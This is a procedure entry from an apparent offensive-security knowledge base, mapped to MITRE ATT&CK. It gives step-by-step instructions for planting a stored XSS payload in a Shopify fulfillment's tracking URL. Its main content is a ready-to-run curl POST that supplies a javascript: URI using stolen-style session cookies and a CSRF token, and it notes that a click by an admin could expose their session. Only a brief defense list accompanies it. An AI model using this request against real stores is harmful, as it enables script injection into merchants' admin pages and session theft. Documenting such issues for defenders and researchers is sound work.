---
tags:
  - xss
  - stored-xss
  - shopify
  - injection
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/shopify-update-fulfillment-malicious-url]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:31.670Z'
sub_techniques: []
id: a67d269e-69fe-4201-ab7a-544ed8dcbd93
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Update-Fulfillment-with-JavaScript-URI-for-Stored-XSS

## Summary

This procedure injects a malicious javascript: URI into a Shopify fulfillment's tracking URL via a crafted POST request, exploiting lack of validation to store XSS payload for later execution.

## Description

The Shopify admin API endpoint for updating fulfillments does not sanitize the tracking_urls parameter, allowing javascript: schemes to be stored and rendered as clickable links. This procedure requires a valid fulfillment ID, CSRF token, and session cookies. Upon success, the payload persists in the order view, executable by any admin clicking the link, potentially stealing sessions.

## Requirements

1. Valid order ID and fulfillment ID from prior steps
2. Authenticated session cookies and CSRF token (extract from browser)
3. HTTP client like curl for the POST request

## Defense

Defensive measures and detection strategies:

- Validate and sanitize all URL inputs to block javascript: schemes
- Monitor API requests for unusual tracking URL patterns
- Implement Content Security Policy (CSP) to restrict script execution

## Objectives

1. Store malicious JavaScript payload in fulfillment tracking
2. Bypass validation for URI injection
3. Enable client-side execution in admin browser context

## Instructions

### Step 1: Prepare Request Details

**Context**: Gather necessary tokens and IDs for authenticated update.

Extract CSRF token from the admin page source or dev tools, and copy session cookies.

> Ensure <store>, <order_id>, and <fulfillment_id> are replaced accurately.

### Step 2: Execute Update Request

**Context**: Send the POST to inject the payload.

**Command** ([[commands/shopify-update-fulfillment-malicious-url]]):
```bash
curl -X POST "https://<your-store>.myshopify.com/admin/orders/<order-id>/fulfillments/<fulfillment-id>" \
  -H "Accept: text/html, application/xhtml+xml, application/xml" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Accept-Language: en-US,en;q=0.8" \
  -H "Connection: keep-alive" \
  -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
  -H "Cookie: <cookies>" \
  -H "X-CSRF-Token: <YOUR_TOKEN>" \
  -H "X-Requested-With: XMLHttpRequest" \
  -d "utf8=%E2%9C%93&_method=put&authenticity_token=<CSRF_TOKEN>&fulfillment[tracking_numbers][]=TrackingNumber&fulfillment[tracking_urls][]=javascript:alert(1);//&fulfillment[tracking_company]=Other&fulfillment[notify_customer]=false&fulfillment[notify_customer]=true"
```

> This overrides to PUT method and sets the tracking URL to the XSS payload. Expected output: 200 OK or successful redirect, with no validation errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/shopify-update-fulfillment-malicious-url]]

## Tools Used


## Tags

- xss
- injection
- shopify-api
